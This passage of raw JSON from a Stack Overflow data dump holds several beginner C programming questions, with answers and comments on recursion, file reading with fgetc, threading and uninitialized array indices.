3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1447275616, "post_id": 33659326, "comment_id": 55093031, "body": "this code has several issues. @user3386109 has already mentioned several. Apart from these there&#39;s aswell a logical error in the code: <code>printArray</code> is recursive, but aswell uses a loop to print the array in reverse order. This leads to misbehaviour, since element <code>x</code> in the array will be printed <code>n - x</code> times this way."}], "answers": [{"tags": [], "owner": {"reputation": 315, "user_id": 4909633, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/46306d5a29264eb0ef79d351df747546?s=128&d=identicon&r=PG&f=1", "display_name": "Snake Eyes", "link": "https://stackoverflow.com/users/4909633/snake-eyes"}, "is_accepted": true, "score": 2, "last_activity_date": 1447276528, "last_edit_date": 1447276528, "creation_date": 1447275841, "answer_id": 33659806, "question_id": 33659326, "link": "https://stackoverflow.com/questions/33659326/printing-array-in-reverse-order-using-recursive-function/33659806#33659806", "title": "Printing Array In Reverse Order using Recursive function", "body": "<p>I edited your code . Here is a new one:</p>\n\n<pre><code>#include&lt;stdio.h&gt; \nvoid PrintArray(int a[],int k) \n{\n    int z;\n    if (k&gt;0) \n    {\n        z= k-1;\n        printf(\"%d \",a[z]);\n        PrintArray(a,z);\n     }\n return; \n } \n int main() \n {\n     int n,i;\n     scanf(\"%d\",&amp;n);\n     int a[n];\n     for(i=0;i&lt;n;i++) \n         scanf(\"%d\",&amp;a[i]);\n     PrintArray(a,n);\n     return 0; \n }\n</code></pre>\n\n<p>Now let me highlight your errors:</p>\n\n<ol>\n<li><p>While using <code>scanf(\"%d\", a[i])</code> you have to use address of the input location. i.e. <code>&amp;a[i]</code>.</p></li>\n<li><p>Your recursive function was of type <code>int</code> and was not returning anything. therefore use <code>void</code> instead of <code>int</code>.</p></li>\n<li><p>The function calling was also syntactically incorrect. While calling the function you should not place <code>[]</code> when you are passing an array. Just Simply pass the name of the array. eg. <code>PrintArray(a,z);</code></p></li>\n<li><p>Your logic in the function is absolutely wrong .The <code>printf(\"%d \",a[k]);</code> will never get executed because it is placed after the function call, so either the the next recursive function will be called or the while loop condition will not be satisfied.</p></li>\n</ol>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user9154240"}, "is_accepted": false, "score": 0, "last_activity_date": 1515194413, "creation_date": 1515194413, "answer_id": 48122649, "question_id": 33659326, "link": "https://stackoverflow.com/questions/33659326/printing-array-in-reverse-order-using-recursive-function/48122649#48122649", "title": "Printing Array In Reverse Order using Recursive function", "body": "<p>This is not work, you need to use this code:</p>\n\n<pre><code>#include&lt;stdio.h&gt; \nvoid PrintArray(int a[],int k) \n{\n   int z;\n   if (k&gt;0) \n   {\n      z= k-1;\n      printf(\"%d \",a[z]);\n      PrintArray(a,z);\n   }\nreturn; \n} \nint main() \n{\n int n,i;\n scanf(\"%d\",&amp;n);\n int a[n];\n for(i=0;i&lt;n;i++) \n     scanf(\"%d\",&amp;a[i]);\n PrintArray(a,n);\n return 0; \n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1521408783, "post_id": 49352529, "comment_id": 85706220, "body": "This is a C question. Do not provide a C++ answer."}], "tags": [], "owner": {"reputation": 11, "user_id": 9425222, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ZVVG97Tuy4s/AAAAAAAAAAI/AAAAAAAACOc/dGgfDL3MNuo/photo.jpg?sz=128", "display_name": "Ahmad Khokhar", "link": "https://stackoverflow.com/users/9425222/ahmad-khokhar"}, "is_accepted": false, "score": 0, "last_activity_date": 1521408407, "last_edit_date": 1521408407, "creation_date": 1521405050, "answer_id": 49352529, "question_id": 33659326, "link": "https://stackoverflow.com/questions/33659326/printing-array-in-reverse-order-using-recursive-function/49352529#49352529", "title": "Printing Array In Reverse Order using Recursive function", "body": "<h2><strong>function</strong></h2>\n\n<p>This function will receive address of array in pointer variable and it will receive the size of array...\nThen the function displays array in reverse order.</p>\n\n<pre><code>void R_output(int *arr, int s) {\n  int l;\n  if(s &gt; 0)\n  {\n    l = s - 1;\n    cout &lt;&lt; arr[l] &lt;&lt; \" \";\n    R_output(arr, l);       \n  } \n  return;\n}\n</code></pre>\n"}], "owner": {"reputation": 255, "user_id": 4802584, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/d8f48f904639b2a2ad00d1f1f65d7e52?s=128&d=identicon&r=PG&f=1", "display_name": "Ramana Uday", "link": "https://stackoverflow.com/users/4802584/ramana-uday"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8374, "favorite_count": 0, "accepted_answer_id": 33659806, "answer_count": 3, "score": 2, "last_activity_date": 1521408407, "creation_date": 1447274048, "question_id": 33659326, "link": "https://stackoverflow.com/questions/33659326/printing-array-in-reverse-order-using-recursive-function", "title": "Printing Array In Reverse Order using Recursive function", "body": "<p>I am trying to print a array in Reverse order by using the recursive function but I am getting so many error can someone guide me through the process please where I am making the mistakes.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint PrintArray(int a[],int k) {\n    int z;\n    while(k&gt;0) {\n        z=k-1;\n        PrintArray(a[],z);\n        printf(\"%d \",a[k]);\n    }\n}\nint main() {\n    int n,i;\n    scanf(\"%d\",&amp;n);\n    int a[n];\n    for(i=0;i&lt;n;i++) \n        scanf(\"%d\",a[i]);\n    PrintArray(a[],n);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447269996, "post_id": 33658272, "comment_id": 55090076, "body": "You might wan to make sure that the character you read is not <code>EOF</code> <i>before</i> you use it. Maybe doing like <code>while ((c = fgetc(fp)) != EOF) { ... }</code> instead."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447270080, "post_id": 33658272, "comment_id": 55090139, "body": "Oh, and the string terminator should be the <i>last</i> character, without it the string functions like <code>strlen</code> will not work and you will get <i>undefined behavior</i>."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1447270081, "post_id": 33658272, "comment_id": 55090140, "body": "Also, the first character that you store should be <code>arr[0]</code>, so you should increment your index <code>d</code> after, not before, assignment to <code>arr[d]</code>."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1447271458, "post_id": 33658272, "comment_id": 55090887, "body": "As above, you need to move <code>d = d + 1;</code> below your <code>if</code> test (or just use e.g. <code>arr[d++] = &#39; &#39;;</code> within the <code>if</code> test). There is also no need to call <code>strlen</code> to null-terminate. <code>d</code> already holds the index to the next char, so just <code>arr[d] = 0;</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447276032, "post_id": 33658272, "comment_id": 55093246, "body": "<code>char c;</code> --&gt; <code>int c;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1447272683, "post_id": 33658343, "comment_id": 55091542, "body": "I would be wary of suggesting learning users use <code>fread</code> instead of the basic <code>fgetc</code>. While it is good to suggest other available functions, it is far more important to help them understand how to correctly do what it is they have questions about first. <code>fread</code>ing the entire file at once is faster, and so is <code>mmap</code>ing the file, but neither will help the OP use <code>fgetc</code> correctly."}], "tags": [], "owner": {"reputation": 456, "user_id": 2574294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c48fbc7bf4885000255c2e19de148dc?s=128&d=identicon&r=PG", "display_name": "Rhialto supports Monica", "link": "https://stackoverflow.com/users/2574294/rhialto-supports-monica"}, "is_accepted": false, "score": 4, "last_activity_date": 1447270556, "last_edit_date": 1447270556, "creation_date": 1447270103, "answer_id": 33658343, "question_id": 33658272, "link": "https://stackoverflow.com/questions/33658272/how-to-read-each-word-in-a-string-from-a-textfile/33658343#33658343", "title": "how to read each word in a string from a textfile", "body": "<p>You get your extra character at the start because you start filling your array at <code>arr[1]</code>.</p>\n\n<p>Furthermore, you can make life even easier by using the <code>fread</code> function:\n<code>\nsize_t\n     fread(void *ptr, size_t size, size_t nmemb, FILE *stream);\n</code>\nto read in a whole block of text at once.\nYou can then separate it into words at your leisure.</p>\n\n<p>Now if you also want to have an array \"containing\" all the separate words, you should look into an <code>array of pointers to char</code>, or <code>char *array[100]</code> (for an appropriate size of course). C doesn't handle strings automatically (as you seem to expect from the last bit of your question \"arr[0] would equal \"Jack\" not \"J\"\".</p>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 7, "last_activity_date": 1447271428, "last_edit_date": 1495539960, "creation_date": 1447271428, "answer_id": 33658704, "question_id": 33658272, "link": "https://stackoverflow.com/questions/33658272/how-to-read-each-word-in-a-string-from-a-textfile/33658704#33658704", "title": "how to read each word in a string from a textfile", "body": "<p>You said:</p>\n\n<blockquote>\n  <p>So for example if i had an array arr with string : <code>\"Jack is a boy\"</code></p>\n  \n  <p><code>arr[0]</code> would equal <code>\"Jack\"</code> not <code>\"J\"</code></p>\n</blockquote>\n\n<p>To do that, <code>arr[0]</code> needs to be a pointer to a null terminated string. That means, <code>arr</code> has to be an array of pointers, not an array of <code>char</code>s.</p>\n\n<pre><code>char* arr[SOME_SIZE] = {0}; // Make SOME_SIZE large enough for your needs.\n</code></pre>\n\n<p>Now you have to figure out where to store the characters that you read from the file. You can use the method used in <a href=\"https://stackoverflow.com/questions/174531/easiest-way-to-get-files-contents-in-c\">Easiest way to get file&#39;s contents in C</a> to read the entire contents of the file. Assuming you got the code to read the contents of the file, let's you have:</p>\n\n<pre><code>char* fileContents = readFileContents(\"text.txt\");\n</code></pre>\n\n<p>and now, <code>fileContents</code> points to an array that looks like:</p>\n\n<pre><code>+---+---+---+---+---+---+---+---+---+---+---+---+---+----+\n| J | a | c | k |   | i | s |   | a |   | b | o | y | \\0 |\n+---+---+---+---+---+---+---+---+---+---+---+---+---+----+\n</code></pre>\n\n<p>Now, you'll need to traverse that array and make sure that:</p>\n\n<ol>\n<li><code>arr[0]</code> - <code>arr[3]</code> point to the right locations in the array.</li>\n<li>The whitespace characters are replace by the null character so that <code>arr[0]</code> - <code>arr[3]</code> point to a null terminated string.</li>\n</ol>\n\n\n\n<pre><code>arr[0]              arr[1]       arr[2]   arr[3]\n|                    |            |        |\nv                    v            v        v\n+---+---+---+---+----+---+---+----+---+----+---+---+---+----+\n| J | a | c | k | \\0 | i | s | \\0 | a | \\0 | b | o | y | \\0 |\n+---+---+---+---+----+---+---+----+---+-- -+---+---+---+----+\n</code></pre>\n\n<p>I hope that gives you enough information to implement the functionality you need.</p>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 2, "last_activity_date": 1447272930, "last_edit_date": 1447272930, "creation_date": 1447272346, "answer_id": 33658919, "question_id": 33658272, "link": "https://stackoverflow.com/questions/33658272/how-to-read-each-word-in-a-string-from-a-textfile/33658919#33658919", "title": "how to read each word in a string from a textfile", "body": "<p>There are three additional subtle issues you will want to look at:</p>\n\n<pre><code>int c = 0;  /* note: 'c' should be 'int' */\n</code></pre>\n\n<p>While <code>char</code> will work for normal characters, you will run into problems if you attempt to read a file containing multi-byte characters.</p>\n\n<p>When you open a file with <code>fopen</code>, you need to check that the file is really open before you attempt to read from it. A simple test is all that is required:</p>\n\n<pre><code>if (!fp) {  /* validate file open succeeded */\n    fprintf (stderr, \"error: file open failed 'text.txt'.\\n\");\n    return 1;\n}\n</code></pre>\n\n<p>(note: <code>if (!fp)</code> is just shorthand for <code>if (fp == NULL)</code>)</p>\n\n<p>The next is the way you read <code>c</code>, assign it to <code>array</code>, and then test if <code>c = EOF</code>. What gets added to the array when <code>c</code> is <code>EOF</code>?</p>\n\n<p>You need to test whether <code>c = EOF</code> before you assign <code>c</code> to <code>arr</code> and not assign it in the case of <code>EOF</code> (which is <code>-1 generally</code>). A quick change to your loop will work:</p>\n\n<pre><code>/* test c before you add it to the array */\nwhile ((c = fgetc (fp)) != EOF)\n{\n    if (c == '\\n') {\n        arr[d++] = ' ';\n    } else\n        arr[d++] = c;\n}\narr[d] = 0; /* null-terminate, note '\\0' = 0 */\n</code></pre>\n"}], "owner": {"reputation": 135, "user_id": 5534390, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/20f7598f9aa0bb43364ad7ea764f9b6e?s=128&d=identicon&r=PG&f=1", "display_name": "Dappa jack", "link": "https://stackoverflow.com/users/5534390/dappa-jack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 359, "favorite_count": 0, "accepted_answer_id": 33658704, "answer_count": 3, "score": 0, "last_activity_date": 1447272930, "creation_date": 1447269777, "last_edit_date": 1447270368, "question_id": 33658272, "link": "https://stackoverflow.com/questions/33658272/how-to-read-each-word-in-a-string-from-a-textfile", "title": "how to read each word in a string from a textfile", "body": "<p>My code is as shown below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    FILE *fp = fopen(\"text.txt\", \"r\");\n    char c;\n    int d = 0;\n    char arr[2000];\n\n    do {\n        c = fgetc(fp);\n        d = d + 1;\n\n        if (c == '\\n') {\n            arr[d] = ' ';\n        } else\n            arr[d] = c;\n    } while (c != EOF);\n\n    int z = strlen(arr);\n    arr[0]= '\\0';\n\n    for (int i = 0;i &lt; z; i++) {\n        arr[i] = arr[i +1];\n    }\n\n    fclose(fp);\n\n    return 0;\n}\n</code></pre>\n\n<p>the code reads a string from a textfile and ands them to an array arr[2000](there are a lot of words in the text file). I wanted to ask if anybody knows a way for the code to read the textfile by each word separated by a space not by character.</p>\n\n<p>So for example if i had an array arr with string : \"Jack is a boy\"</p>\n\n<p>arr[0]    would  equal  \"Jack\"  not  \"J\"</p>\n\n<p>p.s(The reason for the for loop at the end that removes index 0 is because i keep getting a \"(\" character at the beginning of the array)</p>\n\n<p>any help would be much appreciated.</p>\n"}, {"tags": ["c", "multithreading"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1447269791, "post_id": 33658254, "comment_id": 55089958, "body": "There is no such a thing &quot;100% parallel&quot;, unless you have a 100% parallel hardware running the tasks."}, {"owner": {"reputation": 1, "user_id": 5551946, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208112124946580/picture?type=large", "display_name": "Pol&#252;pen", "link": "https://stackoverflow.com/users/5551946/pol%c3%bcpen"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447270287, "post_id": 33658254, "comment_id": 55090243, "body": "My cpu has 8 threads(and fx), it&#39;s just for my computer"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1447270629, "post_id": 33658254, "comment_id": 55090448, "body": "There are only really a few main category of solutions. 1. Your main thread can periodically poll the result. 2. The main thread waits on an event from the child thread indicating that the result is ready (note that this is the even driven model and the main application can also service other events). Which one you choose depends on how you want/need your program to be structured. It sounds like you may want the second approach. There are many ways to do that including <code>pipe</code>+<code>select</code>, <code>pthread_cond_wait</code>, etc."}, {"owner": {"reputation": 1285, "user_id": 5003848, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/12b681a7a5cab103fa1ea1165685555b?s=128&d=identicon&r=PG&f=1", "display_name": "tonysdg", "link": "https://stackoverflow.com/users/5003848/tonysdg"}, "edited": false, "score": 0, "creation_date": 1447300910, "post_id": 33658254, "comment_id": 55101838, "body": "You could try creating individual pthreads and (assuming you have a multi-core computer) use <code>pthread_setaffinity_np()</code> if it&#39;s available to set each thread to its own core.  Crude, not portable, and definitely not good practice, but potentially a solution."}], "owner": {"reputation": 1, "user_id": 5551946, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208112124946580/picture?type=large", "display_name": "Pol&#252;pen", "link": "https://stackoverflow.com/users/5551946/pol%c3%bcpen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1447296225, "creation_date": 1447269704, "last_edit_date": 1447296225, "question_id": 33658254, "link": "https://stackoverflow.com/questions/33658254/c-creating-parallel-backgrounding-thread", "title": "C - Creating parallel backgrounding thread", "body": "<p>I got some question about threading in C. I have a task, that I like to be activated all maybe 20ms. The task is a simple function that perform a request for a procadress on kernel32 The result is a simple true or false.</p>\n\n<p>My problem is, I want to be that the function is called every 20ms or more, parallel while my application is running and if the result is true, the application should be register it.</p>\n\n<p>Is there any simple possilibity? I tried with pthread, but I will pause my main application. The functions calls should be in the background and important 100% parallel.</p>\n\n<p>Hope you did understand it, I don't want code, just gimme the clue for a right hint!</p>\n\n<p>Thanks in advance!</p>\n"}, {"tags": ["c", "arrays", "printf"], "comments": [{"owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "edited": false, "score": 1, "creation_date": 1447269853, "post_id": 33658228, "comment_id": 55089991, "body": "You are not discarding white space before capturing your input and also watch out that goto usage :-P"}, {"owner": {"reputation": 9786, "user_id": 836708, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15d4fb8421a0101bc5c58ca05f331011?s=128&d=identicon&r=PG", "display_name": "emackey", "link": "https://stackoverflow.com/users/836708/emackey"}, "edited": false, "score": 1, "creation_date": 1447269872, "post_id": 33658228, "comment_id": 55090007, "body": "Try initializing <code>c = 0</code> at the top."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1447269879, "post_id": 33658228, "comment_id": 55090009, "body": "<code>c</code> is not initialised when you scan <code>numbers[c]</code>. Set it to 0 and also make sure that you don&#39;t overflow your array when <code>c</code> reaches 100."}, {"owner": {"reputation": 2385, "user_id": 2565958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be3bcf62e85eadc0ff5d40429813e2a3?s=128&d=identicon&r=PG", "display_name": "donjuedo", "link": "https://stackoverflow.com/users/2565958/donjuedo"}, "edited": false, "score": 0, "creation_date": 1447269993, "post_id": 33658228, "comment_id": 55090072, "body": "If you think you need a <code>goto</code>, you can probably find room for improvement on the organization of the code."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1447272240, "post_id": 33658228, "comment_id": 55091289, "body": "There are a lot of ways to avoid goto."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1447277180, "post_id": 33658228, "comment_id": 55093865, "body": "How many devs thought &#39;uninitialized index&#39; before opening the question?"}], "answers": [{"comments": [{"owner": {"reputation": 2385, "user_id": 2565958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be3bcf62e85eadc0ff5d40429813e2a3?s=128&d=identicon&r=PG", "display_name": "donjuedo", "link": "https://stackoverflow.com/users/2565958/donjuedo"}, "edited": false, "score": 0, "creation_date": 1447270254, "post_id": 33658292, "comment_id": 55090224, "body": "I have been programming for almost 40 years.  I learned <code>goto</code> in BASIC, and might have used it briefly in C.  In all the rest of my dev years, I have never seen a need for <code>goto</code>.  I have seen it used carefully and clearly as a convention in kernel dev, but still not seen an actual need.  It gets abused, so I always find a better way."}, {"owner": {"reputation": 55, "user_id": 5437053, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/355d66d4a2ef6c0109bdb0359f7c01de?s=128&d=identicon&r=PG&f=1", "display_name": "ehem", "link": "https://stackoverflow.com/users/5437053/ehem"}, "edited": false, "score": 2, "creation_date": 1447270421, "post_id": 33658292, "comment_id": 55090324, "body": "Thank you very much fo your answers . <b>MARKED</b>"}, {"owner": {"reputation": 2385, "user_id": 2565958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be3bcf62e85eadc0ff5d40429813e2a3?s=128&d=identicon&r=PG", "display_name": "donjuedo", "link": "https://stackoverflow.com/users/2565958/donjuedo"}, "reply_to_user": {"reputation": 55, "user_id": 5437053, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/355d66d4a2ef6c0109bdb0359f7c01de?s=128&d=identicon&r=PG&f=1", "display_name": "ehem", "link": "https://stackoverflow.com/users/5437053/ehem"}, "edited": false, "score": 0, "creation_date": 1447270581, "post_id": 33658292, "comment_id": 55090419, "body": "@ehem, by &quot;abused&quot;, I mean that it can be used to get control to flow where wanted, but in very disorganized ways.  In general, it indicates to me that someone has not finished deciding clearly whether a <code>for</code> loop is best, or a <code>while</code>, or <code>do ... while</code>.  There is always a better way than <code>goto</code>, and future maintainers of your code will not enjoy your work if you use <code>goto</code> (with that kernel dev exception)."}, {"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "reply_to_user": {"reputation": 2385, "user_id": 2565958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be3bcf62e85eadc0ff5d40429813e2a3?s=128&d=identicon&r=PG", "display_name": "donjuedo", "link": "https://stackoverflow.com/users/2565958/donjuedo"}, "edited": false, "score": 0, "creation_date": 1447271178, "post_id": 33658292, "comment_id": 55090733, "body": "@donjuedo I have seen also <code>goto</code> where a long flow is used with various resource management. Each time one takes/acquires a resource a specific bool flag is set. Once the flow fails to take a resource or fails due to any other reason it uses <code>goto</code> to jump to the end of the flow and releases all the taken/acquired resources according to the bool flags (which tells what resource was taken and which was not). <a href=\"https://www.securecoding.cert.org/confluence/display/c/MEM12-C.+Consider+using+a+goto+chain+when+leaving+a+function+on+error+when+using+and+releasing+resources?src=contextnavpagetreemode\" rel=\"nofollow noreferrer\">securecoding.cert.org/confluence/display/c/&hellip;</a>"}, {"owner": {"reputation": 2385, "user_id": 2565958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be3bcf62e85eadc0ff5d40429813e2a3?s=128&d=identicon&r=PG", "display_name": "donjuedo", "link": "https://stackoverflow.com/users/2565958/donjuedo"}, "edited": false, "score": 0, "creation_date": 1447276193, "post_id": 33658292, "comment_id": 55093340, "body": "@AlexLop., I know the technique you&#39;re referring to.  When I see it, I check that it is used strictly as you said, and I move on.  But there are equivalent ways to accomplish that task, without <code>goto</code>.  I won&#39;t go so far as to say &quot;better&quot; because at least that use is well disciplined.  But &quot;equivalent&quot; is fair."}], "tags": [], "owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "is_accepted": true, "score": 0, "last_activity_date": 1447269868, "creation_date": 1447269868, "answer_id": 33658292, "question_id": 33658228, "link": "https://stackoverflow.com/questions/33658228/c-print-array/33658292#33658292", "title": "C - Print Array", "body": "<p>The behavior is UNDEFINED since <code>c</code> is not initialized and you use it as \"index\" (<code>&amp;numbers[c]</code>). This might also cause to segmentation fault and even act as you expect.</p>\n\n<p>What you need to do is to set <code>c</code> to 0 at the very beginning.</p>\n\n<p>Also please try avoiding <code>goto</code> unless there is a real and justified reason to use it.</p>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 1, "last_activity_date": 1447270787, "creation_date": 1447270787, "answer_id": 33658531, "question_id": 33658228, "link": "https://stackoverflow.com/questions/33658228/c-print-array/33658531#33658531", "title": "C - Print Array", "body": "<p>There are several issues you need to address. All of them would have been spelled out for your if you would have compiled with <em>Warnings Enabled</em> (e.g. add <code>-Wall -Wextra</code> to your compile string.) For example:</p>\n\n<pre><code>$ gcc -Wall -Wextra -o bin/go go.c\n\ngo.c: In function \u2018main\u2019:\ngo.c:17:5: warning: format \u2018%c\u2019 expects argument of type \u2018char *\u2019, but argument 2 has type \u2018char (*)[30]\u2019 [-Wformat=]\n scanf(\"%c\",&amp;answer);\n ^\ngo.c:18:15: warning: comparison between pointer and integer [enabled by default]\n if(answer == 'y')\n</code></pre>\n\n<p>If you address each warning until your code compiles without a warning, you then run into your primary problem:</p>\n\n<pre><code>for(c = 0; c &lt; x + 1; c++)\n</code></pre>\n\n<p><code>x + 1</code> causes your loop to read beyond the end of your data. Since you did <em>NOT</em> initialize <code>numbers</code>, it is reading garbage values that were there by default. That is another good lesson: <em>Always initialize your variables</em>.</p>\n\n<p>You will also run into problem with the way you are managing <code>x</code> and <code>c</code>. <code>c</code> should only be updated on successful conversion of a decimal from the user as read by <code>scanf</code>. <code>scanf</code> provides, as it's return, the number of successful conversions. You need to use the return to check for a valid decimal entered by the users, and then update <code>c</code> only upon a successful conversion (not as the result of the user entering <code>y/n</code>.</p>\n\n<p>Cleaning things up a bit, you would be better served by a slight rearrangement of your logic to something similar to:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void) {\n\n    int numbers[100] = { 0 };\n    int c = 0;\n    int i = 0;\n    char answer[30] = { 0 };\n\n    printf (\" Please insert a value: \");\n\nGO:\n\n    if (scanf (\"%d\", &amp;numbers[c]) == 1)\n        c++;\n    getchar ();\n    printf (\" Do you want to add another value (y/n)? \");\n    scanf (\"%c\", answer);\n    if (*answer == 'y') {\n        printf (\" Please insert another value: \");\n        goto GO;\n    }\n\n    for (i = 0; i &lt; c; i++) {\n        printf (\" number[%2d] : %d\\n\", i, numbers[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Output</strong></p>\n\n<pre><code>$ ./bin/go\n Please insert a value: 10\n Do you want to add another value (y/n)? y\n Please insert another value: 11\n Do you want to add another value (y/n)? y\n Please insert another value: 12\n Do you want to add another value (y/n)? n\n number[ 0] : 10\n number[ 1] : 11\n number[ 2] : 12\n</code></pre>\n\n<p>(note: I changed <code>x</code> to <code>i</code> - just felt more normal to iterate <code>i</code>)</p>\n"}], "owner": {"reputation": 55, "user_id": 5437053, "user_type": "registered", "accept_rate": 100, "profile_image": 